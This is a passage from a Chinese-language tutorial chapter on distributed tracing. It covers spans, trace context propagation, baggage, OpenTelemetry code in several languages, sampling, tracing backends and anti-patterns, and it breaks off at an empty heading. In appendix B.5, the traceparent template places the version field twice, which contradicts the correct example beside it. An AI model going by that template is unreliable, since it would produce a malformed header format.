- 有 tracing：一个 traceId 串起所有 span，一眼看到"支付服务耗时 800ms 是瓶颈"。

#### 1.2 链路追踪解决的具体问题

- **延迟分析**：找出请求中最慢的环节（哪一跳、哪个 DB 查询）。
- **错误定位**：找出失败请求在哪个服务、哪个 span 出错。
- **依赖分析**：梳理服务间调用关系（服务 A 依赖 B、C）。
- **异常检测**：发现异常调用模式（如突然出现新的服务依赖、调用环）。
- **性能回归**：发布后对比 trace，发现哪一跳变慢了。

#### 1.3 与日志的区别

| 维度 | 日志 | 链路追踪 |
|------|------|----------|
| 数据单位 | 单条事件 | 一次请求的完整链路 |
| 关注点 | 具体发生了什么 | 请求经过了哪、各环节耗时 |
| 跨服务 | 靠 traceId 串联（手动） | 原生跨服务（自动传播） |
| 数据量 | 大（每事件一条） | 中（每请求一条 trace，多 span） |
| 主要用途 | 排障细节 | 性能和依赖分析 |

追踪是"请求级别"的视图，日志是"事件级别"的视图，互补。

---

### 二、链路追踪核心概念

#### 2.1 Trace（链路）

一次完整的请求链路称为一个 Trace。一个 Trace 包含多个 Span，它们通过父子关系组成一棵树。

\`\`\`
Trace（一次下单）
├── Span: gateway.handle (root span)
    ├── Span: userservice.auth
    ├── Span: productservice.get
    ├── Span: orderservice.create
    │   ├── Span: inventoryservice.deduct
    │   └── Span: paymentservice.pay
    │       └── Span: db.query (UPDATE order...)
\`\`\`

每个 Trace 有全局唯一的 **traceId**。

#### 2.2 Span（跨度）

Span 是链路追踪的基本单元，代表一次操作。一个 Span 包含：

- **操作名（operation name）**：如 "orderservice.create"。
- **开始时间 / 结束时间**：算出耗时（duration）。
- **SpanContext**：traceId + spanId，唯一标识。
- **parentSpanId**：父 span 的 ID，组成父子关系。root span 的 parentSpanId 为空。
- **标签（tags）**：键值对，描述 span 的属性，如 http.method=POST、http.status_code=200。
- **事件（events/logs）**：span 生命周期内的时间点事件，如 "cache miss"、"retry"。
- **状态（status）**：OK / ERROR，错误时记录错误信息。

\`\`\`json
{
  "traceId": "a1b2c3d4e5f6",
  "spanId": "span_005",
  "parentSpanId": "span_002",
  "operationName": "orderservice.create",
  "startTime": 1700000000000,
  "endTime": 1700000000150,
  "duration": 150,
  "tags": { "http.method": "POST", "http.url": "/api/orders", "http.status_code": 200 },
  "events": [{ "timestamp": 1700000000100, "name": "inventory_check_start" }],
  "status": "OK"
}
\`\`\`

#### 2.3 SpanContext（上下文）

SpanContext 是跨进程传播的核心，包含：
- **traceId**：整条链路唯一，所有 span 共享。
- **spanId**：当前 span 唯一。
- **traceFlags**：采样标志（是否采样）。
- **traceState**：厂商自定义信息（如灰度标记）。

SpanContext 通过 HTTP Header（或 RPC metadata）在服务间传播，让下游服务能加入同一个 trace。

#### 2.4 父子关系

Span 通过 parentSpanId 组成树：
- **root span**：链路最顶层的 span，没有 parent（如网关接收请求）。
- **child span**：由父 span 创建，表示父操作的一个子步骤。

父子关系反映调用关系："订单服务创建订单时调用了库存服务"，则 inventory span 是 order span 的 child。

---

### 三、Trace 传播机制

#### 3.1 上下文注入与提取

一次跨服务调用，上游服务要把 SpanContext "注入"到请求中（如 HTTP Header），下游服务再"提取"出来，作为自己 span 的 parent。

\`\`\`
服务 A                          服务 B
  │                               │
  ├─ 创建 spanA (traceId=T, spanId=A)
  ├─ 注入 SpanContext 到 HTTP Header
  ├─ HTTP 请求 ──────────────────→ │
  │                               ├─ 从 Header 提取 SpanContext (traceId=T, spanId=A)
  │                               ├─ 创建 spanB (traceId=T, spanId=B, parentSpanId=A)
  │                               ├─ 处理请求
  │                               ├─ 返回响应
  │ ←─────────────────────────────┤
  ├─ spanA 结束
\`\`\`

#### 3.2 W3C TraceContext 标准

W3C TraceContext 是国际标准，定义了 \`traceparent\` Header：

\`\`\`
traceparent: 00-a1b2c3d4e5f67890123456789abcdef0-b9c1d2e3f4a5b6c7-01
             版本-traceId(32hex)-spanId(16hex)-traceFlags
\`\`\`

- **traceId**：32 个十六进制字符（16 字节），全局唯一。
- **spanId**：16 个十六进制字符（8 字节），span 内唯一。
- **traceFlags**：01 表示采样，00 表示不采样。

W3C 还定义了 \`tracestate\` Header，用于厂商扩展（如灰度标记）。

#### 3.3 B3 多跳传播

B3 是 Zipkin 使用的传播格式（早于 W3C），在 Spring Cloud 生态广泛使用：

\`\`\`
X-B3-TraceId: a1b2c3d4e5f67890123456789abcdef0
X-B3-SpanId: b9c1d2e3f4a5b6c7
X-B3-ParentSpanId: e3f4a5b6c7d8e9f0
X-B3-Sampled: 1
\`\`\`

B3 用多个 Header，W3C 用一个。新项目推荐 W3C，但很多旧系统用 B3。OpenTelemetry 支持两者。

#### 3.4 Baggage（业务数据传递）

Baggage 是随 trace 传播的键值对，用于跨服务传递业务数据：
- userId、tenantId（多租户路由）。
- 灰度标记（如 canary=true，路由到灰度实例）。
- 请求来源（如 source=app/web/admin）。

\`\`\`
baggage: userId=123,tenant=acme,canary=true
\`\`\`

Baggage 随每个跨服务调用传播，但要小心：
- **大小限制**：Header 有大小限制，baggage 不要塞大数据。
- **安全**：baggage 可被客户端伪造，敏感信息要校验或签名。
- **开销**：每次调用都传输，增大请求体积。

---

### 四、OpenTelemetry 标准详解

OpenTelemetry（OTel）是 CNCF 主导的可观测性标准，统一了 Logs、Metrics、Tracing 三大支柱的 API 和 SDK。它的目标是"一次埋点，到处使用"——不绑定具体后端（Jaeger/Zipkin/Prometheus 等）。

#### 4.1 架构组成

- **API**：定义接口（Tracer、Span、Meter 等），应用代码依赖 API。
- **SDK**：API 的实现，配置采样、导出器（Exporter）等。
- **Collector**：接收、处理、导出遥测数据的中间件。应用把数据发给 Collector，Collector 再发给后端（Jaeger/Prometheus/ES）。
- **Instrumentation**：自动埋点库，自动为常见库（HTTP、gRPC、DB 驱动）生成 span。

\`\`\`
应用(API+SDK) → Collector → Jaeger / Prometheus / ES
                ↑
            多种后端，可切换
\`\`\`

#### 4.2 自动埋点 vs 手动埋点

**自动埋点**：Instrumentation 库自动拦截 HTTP/RPC/DB 调用，生成 span。优点是零代码改动，覆盖标准调用；缺点是无法记录业务语义（如"这是下单操作"）。

**手动埋点**：在业务代码里显式创建 span。优点是精确表达业务语义；缺点是代码侵入。

实践：**自动埋点打底 + 手动埋点补充关键业务节点**。自动埋点覆盖 HTTP/DB，手动在关键业务操作（如 createOrder）加 span。

#### 4.3 OpenTelemetry 代码示例

\`\`\`java
// Java - OpenTelemetry 手动埋点
Tracer tracer = openTelemetry.getTracer("order-service");
Span span = tracer.spanBuilder("createOrder")
    .setSpanKind(SpanKind.INTERNAL)
    .startSpan();
try (Scope scope = span.makeCurrent()) {
    span.setAttribute("order.userId", userId);
    span.setAttribute("order.amount", amount);
    // 业务逻辑
    inventoryService.deduct(itemId, qty);  // 自动埋点会生成 child span
} catch (Exception e) {
    span.recordException(e);
    span.setStatus(StatusCode.ERROR, e.getMessage());
} finally {
    span.end();
}
\`\`\`

\`\`\`go
// Go - OpenTelemetry
tracer := otel.Tracer("order-service")
ctx, span := tracer.Start(ctx, "createOrder",
    trace.WithSpanKind(trace.SpanKindInternal),
)
defer span.End()
span.SetAttributes(
    attribute.String("order.userId", userId),
    attribute.Float64("order.amount", amount),
)
\`\`\`

\`\`\`python
# Python - OpenTelemetry
tracer = trace.get_tracer("order-service")
with tracer.start_as_current_span("createOrder") as span:
    span.set_attribute("order.userId", user_id)
    span.set_attribute("order.amount", amount)
    # 业务逻辑
\`\`\`

\`\`\`javascript
// Node.js - OpenTelemetry
const tracer = trace.getTracer('order-service');
const span = tracer.startSpan('createOrder');
span.setAttribute('order.userId', userId);
span.setAttribute('order.amount', amount);
try {
  // 业务逻辑
} catch (e) {
  span.recordException(e);
  span.setStatus({ code: SpanStatusCode.ERROR, message: e.message });
} finally {
  span.end();
}
\`\`\`

#### 4.4 Context 传播

OpenTelemetry 通过 Context 在函数间、服务间传播当前 span。SDK 提供 \`context.active()\` 获取当前 context，\`context.with(span)\` 设置当前 span。HTTP 调用时，自动埋点会从当前 context 提取 SpanContext 注入 Header。

---

### 五、采样策略

追踪数据量大，全量采集开销高（每个 span 几百字节，高 QPS 下每秒几 MB）。采样（Sampling）控制采集比例。

#### 5.1 头部采样（Head-based Sampling）

在 trace 起点决定是否采样，决定后沿链路传播。优点是简单、一致（要么整条 trace 采，要么不采）；缺点是无法基于结果采样（如"只采错误请求"做不到，因为采样时还不知道是否出错）。

\`\`\`
请求进入 → 生成 traceId → 随机决定采不采(1%) → 采样标志传播给所有下游
\`\`\`

#### 5.2 尾部采样（Tail-based Sampling）

在 trace 完成后，根据整体特征决定是否采集。可以"只采错误请求""只采慢请求""只采特定接口"。需要中间缓存所有 span（如 Collector 缓存），开销大但灵活。

\`\`\`
所有 span 都产生 → Collector 缓存 → trace 结束后判断(错误?慢?) → 决定保留或丢弃
\`\`\`

生产实践：头部采样 1%-10% 做常规分析 + 尾部采样保留所有错误/慢请求。

#### 5.3 概率采样

按概率采样，如 1%。简单但可能漏掉重要请求。

#### 5.4 强制采样

特定条件强制采样，如：
- 特定接口（如 /api/admin/*）全采。
- 特定用户（如大客户）全采。
- 调试请求（带 X-Debug-Trace Header）全采。

#### 5.5 采样配置建议

- 高 QPS 服务：头部 1%，尾部保留错误和慢请求。
- 低 QPS 服务：可以全采。
- 关键业务：全采或高采样率。
- 调试：强制采样特定请求。

采样的核心权衡：开销 vs 完整性。采样率不是越低越好——太低会丢失关键信息，太高会拖垮系统。

---

### 六、Span 类型

OpenTelemetry 定义了 Span 的 Kind：

#### 6.1 Server Span（Entry Span）

服务端接收请求的 span。如 HTTP 服务器处理一个请求。它是"入口"，从请求 Header 提取 parent context。

#### 6.2 Client Span（Exit Span）

客户端发起请求的 span。如 HTTP 客户端调用下游服务。它把当前 context 注入请求 Header。

#### 6.3 Internal Span

服务内部操作，不跨进程。如业务逻辑函数。

#### 6.4 Producer / Consumer Span

消息队列场景。Producer 发消息时创建 Producer span，Consumer 收消息时创建 Consumer span。它们之间不是同步父子关系（异步），但通过 traceId 关联。

区分 Span Kind 的意义：帮助分析调用方向（谁调用谁）、统计入口流量和出口依赖。

---

### 七、常用标签与事件

#### 7.1 标准 Span 标签

OpenTelemetry 语义约定（Semantic Conventions）定义了标准标签：

**HTTP 相关**：
- http.method：GET/POST
- http.url / http.target：请求 URL/路径
- http.status_code：响应状态码
- http.flavor：HTTP/1.1、HTTP/2

**RPC 相关**：
- rpc.system：grpc、dubbo
- rpc.service / rpc.method：服务和方法

**数据库相关**：
- db.system：mysql、redis、postgresql
- db.statement：SQL 语句（注意脱敏！）
- db.operation：SELECT/INSERT

**错误相关**：
- error.type：异常类型
- otel.status_code：ERROR
- otel.status_description：错误描述

#### 7.2 Span 事件（Events）

事件是 span 内的时间点标记，用于记录关键时刻：

\`\`\`javascript
span.addEvent('cache_miss', { key: 'user:123' });
span.addEvent('retry', { attempt: 2 });
span.recordException(new Error('timeout'));  // 记录异常事件
\`\`\`

事件有时间戳，用于精细分析 span 内部行为。

---

### 八、分布式追踪场景

#### 8.1 延迟分析

找出请求中最慢的 span。在 Jaeger UI 里看 trace 的瀑布图，最长的 span 就是瓶颈。

常见慢 span 原因：
- **慢 SQL**：db span 耗时长，看 db.statement。
- **下游慢**：client span（调用下游）耗时长。
- **锁等待**：internal span 耗时长但无明显 IO。
- **GC**：span 间隙（无操作但 trace 总耗时长）。

#### 8.2 错误定位

找出失败请求的错误 span。错误 span 有 error 标记，在 UI 上高亮。

通过 trace 看错误传播路径：下游 DB 超时 → 订单服务报错 → 网关返回 500。根因是 DB 超时那一个 span。

#### 8.3 调用拓扑分析

聚合大量 trace 生成服务依赖图：A→B→C。用于：
- 发现意外依赖（如 A 突然调用了 D，可能配置错误）。
- 发现循环依赖（A→B→A）。
- 评估下游故障影响范围（B 挂了影响哪些上游）。

#### 8.4 异常检测

通过 trace 模式发现异常：
- 调用深度突然增加（可能引入了不必要的间接调用）。
- 某接口 P99 突然飙升（可能下游慢了）。
- 错误率突增（可能某服务挂了）。

---

### 九、主流追踪系统对比

#### 9.1 Jaeger（Uber）

- 语言：Go
- 架构：Agent + Collector + Storage（Cassandra/ES）
- 特点：CNCF 项目，OpenTelemetry 原生支持，UI 好，生态广。
- 适用：云原生、K8s 环境。

#### 9.2 Zipkin（Twitter）

- 语言：Java
- 架构：Collector + Storage（MySQL/ES）
- 特点：老牌、轻量、Spring Cloud 生态集成好。B3 传播协议的提出者。
- 适用：Spring Cloud 体系。

#### 9.3 SkyWalking（Apache）

- 语言：Java
- 架构：Agent（字节码增强）+ OAP Server + Storage
- 特点：无侵入（Java Agent 自动埋点）、功能全（含监控+拓扑）、中文社区强。
- 适用：Java 生态、国内企业。

#### 9.4 Pinpoint（Naver）

- 语言：Java
- 架构：Agent + Collector + HBase
- 特点：无侵入、UI 漂亮（调用拓扑图直观）、依赖 HBase。
- 适用：Java 生态，重视可视化。

| 系统 | 语言侵入 | 后端存储 | 自动埋点 | 拓扑图 | OpenTelemetry |
|------|----------|----------|----------|--------|---------------|
| Jaeger | SDK/OTel | ES/Cassandra | OTel Instrumentation | 有 | 原生 |
| Zipkin | SDK/OTel | MySQL/ES | OTel Instrumentation | 有 | 支持 |
| SkyWalking | Java Agent | ES/H2/... | 字节码增强 | 强 | 适配中 |
| Pinpoint | Java Agent | HBase | 字节码增强 | 强 | 不支持 |

新项目推荐 OpenTelemetry + Jaeger（标准化、可切换后端）。Java 老项目无侵入可用 SkyWalking/Pinpoint。

---

### 十、追踪与日志关联

traceId 注入日志，让日志能按 trace 查询。

\`\`\`javascript
// 日志带上 traceId
logger.info({ traceId: currentSpan.traceId, spanId: currentSpan.spanId }, '订单创建');
\`\`\`

在 Jaeger 看到 trace 后，复制 traceId 到 Kibana 搜索，就能看到这次请求的所有日志。这是"tracing 定位范围，日志查细节"的关键桥梁。

OpenTelemetry 的 Logs API 原生支持把 traceId/spanId 作为日志字段，实现三者关联。

---

### 十一、追踪与监控关联

从 span 聚合出 RED 指标：
- **Rate**：span 数量 / 时间 = QPS。
- **Errors**：error span 数量 / 总数 = 错误率。
- **Duration**：span duration 分布 = 延迟分位数。

很多系统（如 Tempo + Metrics Generator）自动从 trace 生成 RED 指标，无需额外埋点。这体现了"三大支柱关联"——trace 数据可以衍生出 metrics。

---

### 十二、实战：一次下单请求的完整链路

一次电商下单的完整 trace：

\`\`\`
[0ms]     gateway.server (POST /api/orders)                    总 920ms
[2ms]       userservice.server (POST /auth/check)              8ms
[12ms]      productservice.server (GET /products/SKU001)       15ms
[30ms]      orderservice.server (POST /orders)                 885ms
[35ms]        orderservice.internal (validateOrder)            5ms
[45ms]        inventoryservice.server (POST /inventory/deduct) 180ms
[50ms]          inventoryservice.db (UPDATE stock)             170ms  ← 慢 SQL
[230ms]       paymentservice.server (POST /pay)                680ms
[235ms]        paymentservice.client (POST /alipay/gateway)    670ms  ← 第三方慢
[910ms]      orderservice.db (INSERT INTO orders)              5ms
\`\`\`

分析：
- 总耗时 920ms，主要在两处：库存 DB 慢（170ms）+ 支付网关慢（670ms）。
- 库存 DB 慢可能是 SQL 缺索引或锁竞争。
- 支付网关慢是第三方问题，需异步化或加超时降级。

没有 tracing，这种分析几乎不可能。

---

### 十三、链路追踪落地实践

#### 13.1 自动埋点为主

优先用 OpenTelemetry Instrumentation 自动埋点，覆盖 HTTP/gRPC/DB/消息队列。零代码改动，快速接入。

#### 13.2 手动埋点补充业务语义

在关键业务操作加手动 span，标注业务属性（如订单金额、商品 ID）。让 trace 不仅显示"调用了 /orders"，还显示"创建了订单，金额 99 元"。

#### 13.3 性能开销控制

- 采样：高 QPS 用 1%-10% 头部采样。
- 异步导出：span 通过异步队列发给 Collector，不阻塞业务。
- 字段精简：不要在每个 span 记录大量标签。

#### 13.4 与告警联动

从 trace 衍生的 RED 指标接入告警：错误率突增、P99 飙升。追踪数据驱动告警，比单纯 metrics 更精准（因为知道是哪条链路）。

#### 13.5 避免敏感信息

不要在 span 标签记录密码、Token、完整 SQL（可能含敏感参数）。OpenTelemetry 默认会记录 db.statement，生产环境要配置脱敏。

---

### 十四、本章小结

链路追踪是微服务可观测性的"骨架"。核心要点：

1. **核心概念**：Trace（链路）= 多个 Span（操作）组成的树，靠 traceId 串联。
2. **传播机制**：W3C TraceContext / B3 通过 HTTP Header 跨服务传播 SpanContext。
3. **OpenTelemetry**：统一标准，API + SDK + Collector + Instrumentation，不绑定后端。
4. **采样**：头部采样简单，尾部采样灵活，组合使用。
5. **Span 类型**：Server/Client/Internal/Producer/Consumer。
6. **标准标签**：http.method、db.system、error 等。
7. **三大场景**：延迟分析、错误定位、依赖拓扑。
8. **三者关联**：traceId 串联日志，span 聚合出 metrics。

下一章我们学习部署与 CI/CD，看看如何把代码安全、自动化地发布到生产。

**面试高频问题**：

- 为什么需要分布式链路追踪？
- Trace、Span、SpanContext 是什么？
- traceId 怎么跨服务传播？W3C TraceContext 格式？
- OpenTelemetry 是什么？为什么用它？
- 头部采样 vs 尾部采样？
- Span 有哪些类型？
- Jaeger、Zipkin、SkyWalking 区别？
- 追踪和日志怎么关联？
- 怎么从 trace 分析慢请求？
- baggage 是什么？使用要注意什么？

**延伸阅读**：

- OpenTelemetry 官方文档：https://opentelemetry.io/docs/
- W3C TraceContext：https://www.w3.org/TR/trace-context/
- 《Mastering Distributed Tracing》—— Yuri Shkuro
- Jaeger 文档：https://www.jaegertracing.io/docs/

---

## 附录 A：采样策略深度剖析

在分布式追踪中，采样决定了"哪些请求被记录"。生产环境流量巨大（每秒上万请求），全量采集成本太高，必须采样。但采样策略直接影响追踪数据的价值。

### A.1 为什么必须采样

假设一个微服务系统有 50 个服务，每秒 1 万请求，每请求产生 10 个 Span。那就是每秒 50 万 Span，每天 432 亿 Span。每个 Span 约 1KB，每天 43TB 数据。这无论对网络、存储还是查询都是灾难。

采样的目标是：用尽量少的数据，保留尽量多的信息。

### A.2 头部采样（Head Sampling）

头部采样在请求入口决定是否采样，决定后通过 trace 上下文传播给所有下游服务。下游看到"不采样"就不记录 Span。

优点：
- 实现简单，入口决定，下游遵循。
- 一致性好——要么全链路都采，要么全不采。
- 性能开销小，不采样的请求几乎零成本。

缺点：
- 采样率固定，可能漏掉重要的错误请求。
- 如果采样率 1%，99% 的请求完全没有追踪数据。
- 无法"事后决定"——入口不知道这个请求后面会不会出错。

适用场景：流量大、错误率低的系统。比如 1% 采样，每天也能采集到足够多的正常请求样本。

### A.3 尾部采样（Tail Sampling）

尾部采样在请求完成后，根据请求的结果（是否出错、耗时多长）决定是否采样。需要先缓冲完整 Trace，再决策。

优点：
- 智能采样——100% 采集错误请求、慢请求。
- 正常请求可以低采样率，节省资源。
- 不会漏掉任何异常 Trace。

缺点：
- 需要缓冲完整 Trace（等待所有 Span 到齐），有延迟。
- 实现复杂，需要专门的收集器（如 OpenTelemetry Collector 的 tail sampling processor）。
- 内存开销大（要缓存近期所有 Trace）。

工作流程：
1. 所有服务把 Span 发到 Collector。
2. Collector 按 traceId 聚合，等待所有 Span 到齐（或超时）。
3. 根据策略决策：出错必采、慢请求必采、正常请求按比例采。
4. 决定采样的 Trace 持久化到存储，不采样的丢弃。

适用场景：对错误分析要求高的系统，如支付、金融。能保证每个故障都有完整的追踪记录。

### A.4 混合采样策略

生产环境常组合使用：

- 入口头部采样 10%（保基本覆盖）。
- 错误请求尾部采样 100%（保故障可查）。
- 慢请求（P99 以上）尾部采样 100%（保性能分析）。

这样既控制了数据量，又确保关键信息不丢。

### A.5 采样率选择指南

| 系统类型 | 建议采样率 | 原因 |
|----------|------------|------|
| 高流量低错误（如 CDN） | 0.1% | 流量大，少量样本即可统计 |
| 中等流量（如电商） | 1-5% | 平衡覆盖和成本 |
| 低流量高价值（如支付） | 100% | 每笔交易都很重要 |
| 调试阶段 | 100% | 需要完整数据定位问题 |
| 稳定运行期 | 1% + 尾部全采错误 | 日常监控 + 异常保障 |

### A.6 多语言对照（采样配置）

Java（OpenTelemetry SDK）：

    // 头部采样：固定比例
    Samplers.traceIdRatioBased(0.01)  // 1% 采样
    
    // 尾部采样需要 Collector 配置
    // 在 OTel Collector 中配置 tail_sampling processor

Go（OpenTelemetry SDK）：

    // 头部采样
    sampler := sdktrace.TraceIDRatioBased(0.01)
    tp := sdktrace.NewTracerProvider(
        sdktrace.WithSampler(sampler),
    )

Python（OpenTelemetry SDK）：

    from opentelemetry.sdk.trace import TracerProvider
    from opentelemetry.sdk.trace.sampling import TraceIdRatioBased
    
    provider = TracerProvider(sampler=TraceIdRatioBased(0.01))

Node.js（OpenTelemetry SDK）：

    const { NodeSDK } = require('@opentelemetry/sdk-node');
    const { TraceIdRatioBasedSampler } = require('@opentelemetry/sdk-trace-base');
    
    const sdk = new NodeSDK({
      traceExporter: new OTLPTraceExporter(),
      sampler: new TraceIdRatioBasedSampler(0.01),
    });

---

## 附录 B：OpenTelemetry 架构详解

OpenTelemetry（OTel）是 CNCF 的可观测性标准，统一了 Metrics、Logs、Traces 三大支柱。它的目标是"一次埋点，到处使用"——不再被厂商锁定。

### B.1 OTel 核心组件

1. API：定义接口（Tracer、Span、Meter 等），应用代码只依赖 API。
2. SDK：实现 API，包含采样、批量、导出等逻辑。
3. Collector：接收、处理、导出遥测数据的中间件。
4. Instrumentation Libraries：自动埋点库（如 HTTP、DB 客户端）。

### B.2 数据流：从应用到后端

    应用 → API → SDK（采样/批量）→ Exporter → Collector → Storage → UI

应用代码调用 API 创建 Span。SDK 根据采样策略决定是否记录。记录的 Span 通过 Exporter（OTLP/gRPC/HTTP）发送到 Collector。Collector 做处理（过滤、尾部采样、增强），再导出到 Jaeger/Zipkin/Prometheus/ES 等后端。

### B.3 Collector 详解

Collector 是 OTel 的核心组件，独立部署，不依赖应用。它的好处：

1. **解耦**：应用不需要知道后端是什么，只发到 Collector。
2. **缓冲**：后端挂了，Collector 缓存数据，不丢数据。
3. **处理**：重采样、过滤、脱敏、丰富（加标签）。
4. **多路导出**：同一份数据发给多个后端（如 Jaeger + ES）。

Collector 三大组件：

- Receiver：接收数据（OTLP、Jaeger、Zipkin 等协议）。
- Processor：处理数据（批量、尾部采样、过滤、属性修改）。
- Exporter：导出数据（到 Jaeger、ES、Prometheus 等）。

### B.4 自动埋点 vs 手动埋点

**自动埋点**：OTel 提供各语言主流框架的自动埋点库，无需改代码就能追踪 HTTP、DB、消息队列等。

    // Node.js 自动埋点：只需启动时注册
    const { NodeSDK } = require('@opentelemetry/sdk-node');
    const { HttpInstrumentation } = require('@opentelemetry/instrumentation-http');
    const { ExpressInstrumentation } = require('@opentelemetry/instrumentation-express');
    
    const sdk = new NodeSDK({
      instrumentations: [new HttpInstrumentation(), new ExpressInstrumentation()],
    });
    sdk.start();

自动埋点覆盖了 80% 的通用场景（HTTP 入口、DB 查询、RPC 调用），但对业务逻辑无能为力。

**手动埋点**：在业务代码关键节点手动创建 Span，记录业务语义。

    // 手动埋点：记录业务关键步骤
    const span = tracer.startSpan('check_inventory');
    span.setAttribute('product_id', productId);
    span.setAttribute('quantity', quantity);
    try {
      const result = await checkInventory(productId, quantity);
      span.setAttribute('in_stock', result.inStock);
      span.end();
    } catch (err) {
      span.recordException(err);
      span.setStatus({ code: 2, message: err.message });
      span.end();
      throw err;
    }

最佳实践：自动埋点覆盖通用调用 + 手动埋点补充业务关键节点。

### B.5 Context Propagation 详解

上下文传播是分布式追踪的核心——让 traceId/spanId 跨服务传递。

OTel 支持两种传播格式：

1. W3C TraceContext：标准格式，traceparent + tracestate 头。
2. B3：Zipkin 的格式，X-B3-TraceId 等多个头。

W3C TraceContext 的 traceparent 格式：

    traceparent: 00-{version}-{trace-id}-{parent-id}-{trace-flags}
    例: traceparent: 00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01

- version：格式版本，目前 00。
- trace-id：32 字符十六进制，全链路唯一。
- parent-id：16 字符十六进制，当前 Span 的 ID。
- trace-flags：1 字节，bit 0 表示是否采样。

传播机制：

1. 服务 A 收到请求，提取 traceparent 头，创建 Span（parent-id = 头中的 parent-id）。
2. 服务 A 调用服务 B 时，注入新的 traceparent 头（parent-id = A 的新 Span ID）。
3. 服务 B 提取头，创建自己的 Span。
4. 链路就这样一环扣一环传下去。

### B.6 Baggage 机制

除了 traceId/spanId，OTel 还支持 Baggage——跨服务传递业务键值对。

    // 服务 A 设置 Baggage
    baggage.set('user_id', '12345');
    baggage.set('tier', 'vip');
    
    // 服务 B 读取 Baggage
    const userId = baggage.get('user_id');  // '12345'

Baggage 通过 HTTP 头（baggage: user_id=12345,tier=vip）传播。适合传递少量业务上下文（如用户 ID、租户 ID、AB 实验组）。

注意：Baggage 会增加请求头大小，不要放太多数据。且 Baggage 对所有下游可见，不要放敏感信息。

---

## 附录 C：追踪系统部署与运维

### C.1 Jaeger 部署架构

Jaeger 是 CNCF 的分布式追踪系统，由 Uber 开源。

架构组件：

1. Agent：Daemon，部署在每个节点，接收应用上报的 Span，转发给 Collector。
2. Collector：接收 Span，处理（去重、校验），写入存储。
3. Storage：后端存储（ES、Cassandra、Kafka）。
4. Query：查询服务，从存储读 Trace，返回 UI。
5. UI：Web 界面，可视化 Trace。

部署模式：

- **直接上报**：应用直接发 Span 到 Collector，省去 Agent，适合容器化环境。
- **Agent 模式**：应用发到本地 Agent，Agent 批量转发，适合虚拟机环境。
- **Streaming**：Span 先写 Kafka，Collector 从 Kafka 消费，适合高流量场景。

### C.2 存储选型

| 存储 | 优点 | 缺点 | 适用规模 |
|------|------|------|----------|
| Elasticsearch | 全文检索强、生态好 | 资源消耗大、运维复杂 | 中大型 |
| Cassandra | 写入高性能、可扩展 | 查询能力弱、运维复杂 | 大型 |
| Kafka | 高吞吐缓冲 | 不能直接查询（需配合） | 超大型缓冲 |
| Badger（内嵌） | 零依赖、简单 | 不支持分布式、容量有限 | 小型/测试 |

选型建议：
- 中小规模用 ES（已有 ELK 就复用）。
- 超大规模用 Cassandra（写入性能好）。
- 极高流量用 Kafka 缓冲 + ES/Cassandra 存储。

### C.3 数据保留策略

追踪数据通常保留 3-7 天（不像日志要保留几个月）。原因：

1. 追踪主要用于实时排障，过期的 Trace 价值低。
2. 追踪数据量大，长期保留成本高。
3. 长期趋势分析用 Metrics（聚合数据），不需要原始 Trace。

ES 配置 ILM（Index Lifecycle Management）自动删除过期索引：

    PUT _ilm/policy/jaeger-policy
    {
      "policy": {
        "phases": {
          "hot": { "actions": {} },
          "delete": {
            "min_age": "7d",
            "actions": { "delete": {} }
          }
        }
      }
    }

### C.4 性能优化

1. **批量发送**：SDK 批量发送 Span（如每 5 秒或满 512 条），减少网络开销。
2. **异步导出**：Span 导出异步，不阻塞业务线程。
3. **合理采样**：高流量服务低采样率，低流量服务高采样率。
4. **Collector 扩容**：Collector 无状态，可水平扩展。根据 CPU/内存自动扩缩容。
5. **存储优化**：ES 用 hot-warm-cold 架构，热数据 SSD，冷数据 HDD。

---

## 附录 D：链路追踪实战场景

### D.1 场景一：定位慢请求

用户反馈"下单很慢"，从追踪系统排查：

1. 在 Jaeger UI 按 service=order-service + duration>2s 搜索。
2. 找到慢请求 Trace，查看 Span 瀑布图。
3. 发现 inventory-service 的 Span 耗时 1.8s（占总耗时 90%）。
4. 展开该 Span，看到 db.statement 是 SELECT，db.duration=1.7s。
5. 定位到是库存查询慢 SQL，加索引后解决。

这个流程的关键是：Span 记录了每一步的耗时和详细信息（DB 语句、HTTP URL），让排查"有迹可循"。

### D.2 场景二：错误根因分析

支付失败率突然升高，排查：

1. 按 service=payment-service + error=true 搜索 Trace。
2. 找到失败 Trace，查看错误 Span。
3. Span 记录了异常：ConnectionRefusedError: connect ECONNREFUSED 10.0.1.5:6379。
4. 定位到是 Redis 连接被拒。检查 Redis 发现主节点刚做了故障切换，应用还在连旧 IP。
5. 重启应用重新连接 Redis，问题解决。

没有追踪系统，这个问题可能要花很长时间才能定位到"哪个服务、哪个调用、什么错误"。

### D.3 场景三：服务依赖分析

新来的同事问"这个服务依赖了哪些下游？"通过追踪系统：

1. 在 Jaeger 的 Dependencies 页面查看依赖图。
2. 可视化展示 service-a 调用了 service-b、service-c、db-mysql、redis。
3. 还能看到调用频率和错误率。

这比看代码或文档更准确——追踪数据是真实运行时的依赖关系，包括间接依赖。

### D.4 场景四：容量规划

通过追踪数据统计各服务的调用量和延迟分布：

1. 导出一周的追踪数据。
2. 统计每个服务的 P50/P99 延迟趋势。
3. 发现 service-c 的 P99 延迟在持续上升（从 200ms 涨到 800ms）。
4. 提前扩容或优化，避免影响用户体验。

追踪数据是"真实的性能基线"，比压测更贴近实际。

---

## 附录 E：追踪反模式与陷阱

### E.1 过度埋点

每个函数都加 Span，导致 Span 数量爆炸。一次请求产生上百个 Span，既浪费资源又难以分析。

正确做法：只在关键节点埋点——跨进程调用、重要业务逻辑、外部依赖。一个请求 5-15 个 Span 为宜。

### E.2 Span 命名不当

Span 名用动态值（如 Span 名 = "GET /users/12345/orders/67890"），导致每个 URL 产生不同的 Span 名，无法聚合。

正确做法：Span 名用模板（如 "GET /users/:userId/orders"），动态值放属性。这样同类请求可聚合统计。

### E.3 忘记结束 Span

创建 Span 后忘记调用 span.end()，导致 Span 永远不关闭，占用内存，最终 OOM。

正确做法：用 try-finally 确保 Span 一定结束：

    const span = tracer.startSpan('operation');
    try {
      // 业务逻辑
    } finally {
      span.end();
    }

### E.4 阻塞式导出

Span 导出用同步 HTTP 调用，阻塞业务线程，影响性能。

正确做法：用异步批量导出。OTel SDK 默认就是异步批量的，但自定义 Exporter 要注意。

### E.5 忽略上下文传播

在异步场景（线程切换、消息队列）中忘记传播 trace 上下文，导致链路断裂。

正确做法：用 OTel 的 context API 在异步边界传播上下文。对于消息队列，把 traceparent 放在消息头中。

### E.6 敏感信息泄露

